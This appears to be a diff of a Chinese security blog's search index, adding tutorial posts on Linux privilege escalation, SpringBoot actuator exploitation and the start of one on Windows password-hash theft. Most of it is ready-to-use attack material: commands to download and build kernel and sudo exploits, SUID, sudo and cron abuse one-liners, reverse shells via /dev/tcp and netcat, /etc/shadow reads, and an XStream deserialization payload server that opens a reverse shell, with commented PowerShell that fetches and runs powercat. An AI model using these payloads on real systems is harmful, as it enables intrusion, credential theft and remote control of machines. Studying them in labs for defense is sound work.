+<p>利用exp： <a href="https://github.com/CrisWang/Exploit-Virtual-Machine/blob/master/Linux/01-CVE-2019-13272.c">https://github.com/CrisWang/Exploit-Virtual-Machine/blob/master/Linux/01-CVE-2019-13272.c</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/47163 -O exp.c</span><br><span class="line">gcc exp.c –o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-4-CVE-2019-7304"><a href="#1-4-CVE-2019-7304" class="headerlink" title="1.4 CVE-2019-7304"></a>1.4 CVE-2019-7304</h5><p>漏洞范围： </p>
+<p>​    Ubuntu版本范围：Ubuntu 18.10 Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 LTS</p>
+<p>​    snap版本范围： 2.28 &lt; snapd &lt; 2.37</p>
+<p>利用exp：<a href="https://github.com/initstring/dirty_sock">https://github.com/initstring/dirty_sock</a></p>
+<h5 id="1-5-Linux-sudo权限提升漏洞"><a href="#1-5-Linux-sudo权限提升漏洞" class="headerlink" title="1.5 Linux sudo权限提升漏洞"></a>1.5 Linux sudo权限提升漏洞</h5><p>漏洞编号：CVE-2021-3156 </p>
+<p>影响版本：sudo 1.8.2-1.8.31p2、sudo 1.9.0-1.9.5p1</p>
+<p>漏洞检测：sudoedit -s / </p>
+<p>如果返回以sudoedit:开头的错误，则当前系统可能存在安全风险； 显示以usage:开头的错误，则无漏洞风险</p>
+<p>漏洞利用：<a href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156.git</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> CVE-2020-1356/</span><br><span class="line">make</span><br><span class="line">./sudo</span><br><span class="line">./sudo-hax-me-a-sandwich</span><br><span class="line">./sudo-hax-me-a-sandwich &lt;target_number&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-Linux环境变量提权"><a href="#0x03-Linux环境变量提权" class="headerlink" title="0x03 Linux环境变量提权"></a>0x03 Linux环境变量提权</h3><h5 id="1-PATH环境变量"><a href="#1-PATH环境变量" class="headerlink" title="1 PATH环境变量"></a>1 PATH环境变量</h5><p>PATH是Linux和类Unix操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执 行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。</p>
+<p>suid权限说明：</p>
+<ol>
+<li>启动为进程之后，其进程的属主为原程序文件的属主 </li>
+<li>只能作用在二进制程序上,不能作用在脚本上,且设置在目录上无意义 </li>
+<li>执行suid权限的程序时,此用户将继承此程序的所有者权限</li>
+</ol>
+<h5 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2 步骤"></a>2 步骤</h5><p>find命令查找拥有suid权限的文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/09/Linux%E6%8F%90%E6%9D%83/1.png"></p>
+<p>新建文件并重定向命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> “/bin/bash”&gt; pppd</span><br><span class="line">chmod 777 ps</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/09/Linux%E6%8F%90%E6%9D%83/2.png"></p>
+<p>运行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/kali/shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/09/Linux%E6%8F%90%E6%9D%83/3.png"></p>
+<h3 id="0x03-SUDO滥用提权"><a href="#0x03-SUDO滥用提权" class="headerlink" title="0x03 SUDO滥用提权"></a>0x03 SUDO滥用提权</h3><h5 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1 基本信息"></a>1 基本信息</h5><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。 执行流程: 当前用户转换到root, 然后以root身份执行命令, 执行完成后, 直接退回到当前用户. </p>
+<p>注意：执行sudo时输入的密码, 是当前用户的密码, 并非root密码. </p>
+<p>sudo配置文件：/etc/sudoers 配置</p>
+<p>文件权限： 0440</p>
+<p>显示出自己（执行 sudo 的使用者）的权限</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/09/Linux%E6%8F%90%E6%9D%83/4.png"></p>
+<p>执行环境变数中的 shell所指定的 shell ，或是 /etc/passwd 里所指定的 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo –s</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-sudo提权命令"><a href="#2-sudo提权命令" class="headerlink" title="2 sudo提权命令"></a>2 sudo提权命令</h5><p>可以利用一下命令进行sudo提权</p>
+<p><code>wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp、ed、screen</code></p>
+<h6 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码执行后直接切换到root用户，不需要输入密码</p>
+<p><img src="/2022/09/09/Linux%E6%8F%90%E6%9D%83/5.png"></p>
+<p>还有其他的一些都可以达到相同目的</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/ash</span><br><span class="line">sudo /usr/bin/awk -F: <span class="string">&#x27;&#123;print $1 $2&#125;&#x27;</span> /etc/shadow</span><br><span class="line">sudo curl file:///etc/shadow</span><br><span class="line">sudo find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x04-Linux定时任务提权"><a href="#0x04-Linux定时任务提权" class="headerlink" title="0x04 Linux定时任务提权"></a>0x04 Linux定时任务提权</h4><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出。默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">系统定时任务：<span class="regexp">/etc/</span>crontab</span><br><span class="line">用户定时任务：<span class="regexp">/var/</span>spool<span class="regexp">/cron/</span></span><br></pre></td></tr></table></figure>
+
+<p>我通过可以查看到，，每2分钟运行一次cleanup.py脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/09/Linux%E6%8F%90%E6%9D%83/6.png"></p>
+<p>查看脚本权限为普通用户可写</p>
+<p><img src="/2022/09/09/Linux%E6%8F%90%E6%9D%83/7.png"></p>
+<p>打开文件，比如，用下面的命令替换原来命令中的<code>os.system(‘rm -r /home/cleanup/* ‘)</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/09/Linux%E6%8F%90%E6%9D%83/8.png"></p>
+<p>2分钟后，tmp目录下就会存在SUID权限的bash，运行 <code>/tmp/bash -p</code> 后就获取了root权限。</p>
+<p><img src="/2022/09/09/Linux%E6%8F%90%E6%9D%83/9.png"></p>
+<h4 id="0x05-SUID提权"><a href="#0x05-SUID提权" class="headerlink" title="0x05 SUID提权"></a>0x05 SUID提权</h4><p>suid权限说明： </p>
+<p>1.启动为进程之后，其进程的属主为原程序文件的属主 </p>
+<p>2.只能作用在二进制程序上,不能作用在脚本上,且设置在目录上无意义 </p>
+<p>3.执行suid权限的程序时,此用户将继承此程序的所有者权限</p>
+<h5 id="查找具有SUID权限的文件"><a href="#查找具有SUID权限的文件" class="headerlink" title="查找具有SUID权限的文件"></a>查找具有SUID权限的文件</h5><p>执行以下两个中任意命令，利用find找到有SUID权限（SUID按8进制为4）的文件并使用ls命令列出</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><h6 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
+
+<p>之后执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h6 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/unix/<span class="built_in">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>
+
+<p>较新版可使用 –script 参数：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</span><br></pre></td></tr></table></figure>
+
+<h6 id="find"><a href="#find" class="headerlink" title="find"></a>find</h6><p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch <span class="built_in">test</span></span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> whoami \;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">进入shell</span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line">sh-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h6 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h6><p>广播shell:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> netcat -lvp 5555 -e /bin/sh \;</span><br></pre></td></tr></table></figure>
+
+<p>kali(攻击机)上:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 靶机ip 4444</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/攻击机IP/4444 0&gt;&amp;1&#x27;</span> \;</span><br></pre></td></tr></table></figure>
+
+<p>kali(攻击机)上：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<h6 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi/vim"></a>vi/vim</h6><p>打开vim,按下ESC</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim -c <span class="string">&#x27;!sh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2<span class="comment"># id</span></span><br><span class="line">uid=1002(<span class="built_in">test</span>) gid=1002(<span class="built_in">test</span>) euid=0(root) groups=1002(<span class="built_in">test</span>)</span><br></pre></td></tr></table></figure>
+
+<h6 id="less"><a href="#less" class="headerlink" title="less"></a>less</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<h6 id="more"><a href="#more" class="headerlink" title="more"></a>more</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">more /home/pelle/myfile</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h6 id="awk-1"><a href="#awk-1" class="headerlink" title="awk"></a>awk</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="man"><a href="#man" class="headerlink" title="man"></a>man</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h6 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.56.1:8080/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h6 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h6><p>仅可查看文件，不能弹 shell：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apache2 -f /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<h6 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $<span class="string">&#x27;id\ncat /etc/shadow&#x27;</span> &gt; /tmp/.<span class="built_in">test</span></span><br><span class="line">chmod +x /tmp/.<span class="built_in">test</span></span><br><span class="line">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.<span class="built_in">test</span> -Z root</span><br></pre></td></tr></table></figure>
+
+<h6 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="perl"><a href="#perl" class="headerlink" title="perl:"></a>perl:</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> <span class="string">&quot;/bin/bash&quot;</span>;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>渗透测试</category>
       </categories>
       <tags>
         <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SpringBoot未授权访问</title>
+    <url>/2023/05/18/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
+    <content><![CDATA[<h1 id="Springboot-未授权访问"><a href="#Springboot-未授权访问" class="headerlink" title="Springboot     未授权访问"></a>Springboot     未授权访问</h1><h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><h3 id="0x00-Springboot相关介绍"><a href="#0x00-Springboot相关介绍" class="headerlink" title="0x00 Springboot相关介绍"></a>0x00 Springboot相关介绍</h3><p>Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者。</p>
+<span id="more"></span>
+
+<h3 id="0x01漏洞发现"><a href="#0x01漏洞发现" class="headerlink" title="0x01漏洞发现"></a>0x01漏洞发现</h3><h4 id="1-识别当前-web-应用使用的框架为-springboot-框架"><a href="#1-识别当前-web-应用使用的框架为-springboot-框架" class="headerlink" title="1.  识别当前 web 应用使用的框架为 springboot 框架"></a>1.  识别当前 web 应用使用的框架为 springboot 框架</h4><p><img src="/2023/05/18/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/1.png"></p>
+<h4 id="2-报错页面"><a href="#2-报错页面" class="headerlink" title="2.  报错页面"></a>2.  报错页面</h4><p><img src="/2023/05/18/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/2.png"></p>
+<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><h4 id="1-数据库账户密码泄露"><a href="#1-数据库账户密码泄露" class="headerlink" title="1.  数据库账户密码泄露"></a>1.  数据库账户密码泄露</h4><p>由于 actuator 会监控站点 mysql、mangodb 之类的数据库服务，所以通过监控信息有时可以拿下 mysql、mangodb 数据库；这个主要通过/env 路径获取这些服务的配置信息，比如如下站点存在 actuator 配置不当漏洞，通过其/env 路径，可获得 mysql、mangodb 的用户名及密码（这里由于环境原因没有配置明文，实际的生产环境会存在明文密码的现象）。</p>
+<p><img src="/2023/05/18/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/3.png"></p>
+<h4 id="2-数据库账户密码泄露"><a href="#2-数据库账户密码泄露" class="headerlink" title="2.  数据库账户密码泄露"></a>2.  数据库账户密码泄露</h4><p>这个主要通过访问/trace 路径，比如如下站点存在 actuator 配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP 头等），实际环境中还会存在有用户 token、cookie 字段</p>
+<p><img src="/2023/05/18/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/4.png"></p>
+<h4 id="3-利用反序列化进行getshell"><a href="#3-利用反序列化进行getshell" class="headerlink" title="3.  利用反序列化进行getshell"></a>3.  利用反序列化进行getshell</h4><h5 id="1-启动脚本"><a href="#1-启动脚本" class="headerlink" title="(1)启动脚本"></a>(1)启动脚本</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># linux反弹shell bash -i &gt;&amp;amp; /dev/tcp/192.168.20.82/9999 0&gt;&amp;amp;1</span></span><br><span class="line"><span class="comment"># windows反弹shell</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powershell&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powercat -c 192.168.123.1 -p 2333 -e cmd&lt;/string&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/xstream&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/xstream/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                    &lt;string&gt;bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/10.1.1.135/1234 0&gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">2333</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/18/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/5.png"></p>
+<h5 id="2-开启监听"><a href="#2-开启监听" class="headerlink" title="(2)  开启监听"></a>(2)  开启监听</h5><p><img src="/2023/05/18/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/6.png"></p>
+<h5 id="3-写入配置，访问10-1-1-137-8090-env然后利用burpsuite抓包，鼠标右键选择“Change-request-method”将get请求改为post请求-Post数据的内容（ip为本机的ip）：eureka-client-serviceUrl-defaultZone-10-1-1-135-2333-xstream"><a href="#3-写入配置，访问10-1-1-137-8090-env然后利用burpsuite抓包，鼠标右键选择“Change-request-method”将get请求改为post请求-Post数据的内容（ip为本机的ip）：eureka-client-serviceUrl-defaultZone-10-1-1-135-2333-xstream" class="headerlink" title="(3)  写入配置，访问10.1.1.137:8090/env然后利用burpsuite抓包，鼠标右键选择“Change request method”将get请求改为post请求,Post数据的内容（ip为本机的ip）：eureka.client.serviceUrl.defaultZone=10.1.1.135:2333/xstream"></a>(3)  写入配置，访问10.1.1.137:8090/env然后利用burpsuite抓包，鼠标右键选择“Change request method”将get请求改为post请求,Post数据的内容（ip为本机的ip）：eureka.client.serviceUrl.defaultZone=10.1.1.135:2333/xstream</h5><p><img src="/2023/05/18/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/7.png"></p>
+<h5 id="4-然后再访问：http-10-1-1-137-8090-refresh抓包，鼠标右键选择“Change-request-method”将get请求更改为post请求"><a href="#4-然后再访问：http-10-1-1-137-8090-refresh抓包，鼠标右键选择“Change-request-method”将get请求更改为post请求" class="headerlink" title="(4)  然后再访问：http://10.1.1.137:8090/refresh抓包，鼠标右键选择“Change request method”将get请求更改为post请求"></a>(4)  然后再访问：<a href="http://10.1.1.137:8090/refresh%E6%8A%93%E5%8C%85%EF%BC%8C%E9%BC%A0%E6%A0%87%E5%8F%B3%E9%94%AE%E9%80%89%E6%8B%A9%E2%80%9CChange">http://10.1.1.137:8090/refresh抓包，鼠标右键选择“Change</a> request method”将get请求更改为post请求</h5><h5 id="5-反弹SHELL成功"><a href="#5-反弹SHELL成功" class="headerlink" title="(5)反弹SHELL成功"></a>(5)反弹SHELL成功</h5><p><img src="/2023/05/18/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/8.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -1107,6 +1543,194 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
 
 <p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/28.png"></p>
 <p>成功提权</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows密码凭证获取</title>
+    <url>/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
+    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Windows-Hash简介"><a href="#0x00-Windows-Hash简介" class="headerlink" title="0x00  Windows Hash简介"></a>0x00  Windows Hash简介</h3><h4 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h4><p>所谓哈希（hash），就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一 次数学加密函数运算，然后返回一个固定长度的字符串。 现在已经有了更新的NTLMv2以及Kerberos验证体系。</p>
+<p>Windows系统使用两种方法对用户的密码进行哈希处理，它们分别是LAN Manager（LM）哈希和NT LAN Manager（NTLM）哈希Windows加密过的密码口令，我们称之为hash，Windows的系统密码hash默认情况下一般由两部分组成：第一 部分是LM-hash，第二部分是NTLM-hash。</p>
+<span id="more"></span>
+
+<p>Windows Hash格式：</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">用户名称<span class="symbol">:RID</span><span class="symbol">:LM-HASH</span>值<span class="symbol">:NT-HASH</span>值</span><br></pre></td></tr></table></figure>
+
+<p>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>2000</th>
+<th>xp</th>
+<th>2003</th>
+<th>Vista</th>
+<th>win7</th>
+<th>2008</th>
+<th>2012</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LM</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>NTLM</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+</tbody></table>
+<h4 id="Windows-认证基础"><a href="#Windows-认证基础" class="headerlink" title="Windows 认证基础"></a>Windows 认证基础</h4><p>Windows的认证包括三个部分： </p>
+<ul>
+<li><p>本地认证：用户直接操作计算机登陆账户 </p>
+</li>
+<li><p>网络认证：远程连接到工作组中的某个设备 </p>
+</li>
+<li><p>域认证：登陆到域环境中的某个设备</p>
+</li>
+</ul>
+<h4 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h4><ul>
+<li><p>用户输入密码 </p>
+</li>
+<li><p>系统收到密码后将用户输入的密码计算成NTLM Hash </p>
+</li>
+<li><p>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对 </p>
+</li>
+<li><p>匹配则登陆成功，不匹配则登陆失败</p>
+</li>
+</ul>
+<p>本地认证中用来处理用户输入密码的进程为lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p>
